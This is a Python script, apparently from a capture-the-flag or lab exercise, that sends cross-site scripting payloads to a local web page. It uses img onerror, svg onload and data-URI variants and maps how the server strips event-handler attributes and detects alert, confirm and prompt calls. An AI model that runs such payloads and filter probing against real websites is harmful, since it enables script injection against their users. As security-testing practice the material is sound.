import requests
import re

url = "http://127.0.0.1:33031/page"

print("=" * 70)
print("DETAILED RESPONSE ANALYSIS - NON-TRIGGERED PAYLOADS")
print("=" * 70)

# Test payloads that didn't trigger "unconfigurable property" error
# These returned 200 with 931 chars (different from 1022+ triggered ones)

test_payloads = [
    # Cookies/test payloads - avoiding on\w+ pattern
    ("img src with data:", '<img src="data:image/svg+xml,<svg onload=alert(1)>">'),
    ("img src with invalid", '<img src=x onerror=alert(1)>'),  # Standard but lowercase
    ("svg with onload lowercase", '<svg onload=alert(1)>'),
    
    # Test if filters are removing content
    ("basic img", "<img src=x>"),
    ("basic tag", "<b>test</b>"),
    
    # Test if on\w+ removal is happening
    ("img with plain text", '<img src=x onerror=>'),
    
    # Test whether alert is being stripped or modified  
    ("just alert", "alert('XSS')"),
    ("img with onerror only", '<img src=x onerror="">'),
]

for name, payload in test_payloads:
    resp = requests.post(url, data={"solution": payload})
    print(f"\n[TEST] {name}")
    print(f"Sent: {payload}")
    print(f"Status: {resp.status_code}")
    print(f"Length: {len(resp.text)} chars")
    
    # Extract the echoed content from response
    # Look for where the solution parameter is reflected
    echo_match = re.search(r'detailPanel">(.*?)</div>', resp.text, re.DOTALL)
    if echo_match:
        echoed = echo_match.group(1).strip()
        print(f"Echoed content: {echoed[:200]}")
        
        # Check how payload was processed
        if payload.lower() in echoed.lower():
            print("  [+] Payload reflected (possibly with case change)")
        elif re.sub(r'on\w+', '', payload, flags=re.I).strip() in echoed:
            print("  [!] on\\w+ pattern was stripped!")
        else:
            print("  [?] Payload modified significantly")
    else:
        print(f"Response preview: {resp.text[:300]}")

# Now test specifically for how on\w+ is filtered
print("\n" + "=" * 70)
print("TESTING on\\w+ FILTER BEHAVIOR")
print("=" * 70)

behavior_tests = [
    ("onerror lowercase", "test onerror=test"),
    ("onerror uppercase", "test ONERROR=test"),
    ("onerror mixed", "test OnErRoR=test"),
    ("multiple on", "onload=1 onerror=2 onclick=3"),
    ("on at start", "onload=alert(1)"),
    ("on in middle", "x onerror=alert(1) y"),
    ("alert only", "alert('test')"),
]

for name, payload in behavior_tests:
    resp = requests.post(url, data={"solution": payload})
    print(f"\n[BEHAVIOR] {name}")
    print(f"  Sent: '{payload}'")
    
    # Try to find the echoed solution
    if 'detailPanel' in resp.text:
        match = re.search(r'detailPanel">(.*?)</div>', resp.text, re.DOTALL)
        if match:
            echo = match.group(1).strip()
            print(f"  Echoed: '{echo}'")
            
            # Determine what happened
            orig_on_count = len(re.findall(r'on\w+', payload, re.I))
            echoed_on_count = len(re.findall(r'on\w+', echo, re.I))
            
            if orig_on_count > 0 and echoed_on_count == 0:
                print(f"  [!] All on\\w+ patterns REMOVED (stripped from response)")
            elif orig_on_count > echoed_on_count:
                print(f"  [~] Some on\\w+ patterns removed ({orig_on_count} -> {echoed_on_count})")
            elif orig_on_count == echoed_on_count:
                print(f"  [+] All on\\w+ patterns preserved")
    
    if "unconfigurable property" in resp.text:
        print(f"  [!] ALERT DETECTION TRIGGERED")

# Check what triggers the "unconfigurable property" error
print("\n" + "=" * 70)
print("TESTING ALERT DETECTION TRIGGERS")
print("=" * 70)

alert_tests = [
    ("alert() lowercase", "alert('X')"),
    ("alert() uppercase", "ALERT('X')"),
    ("alert() mixed", "Alert('X')"),
    ("alert without parens", "alert"),
    ("alert with space", "alert ('X')"),
    ("window.alert", "window.alert('X')"),
    ("confirm", "confirm('X')"),
    ("prompt", "prompt('X')"),
]

for name, payload in alert_tests:
    resp = requests.post(url, data={"solution": payload})
    triggered = "unconfigurable property" in resp.text
    print(f"  {name}: {'TRIGGERED' if triggered else 'not triggered'}")

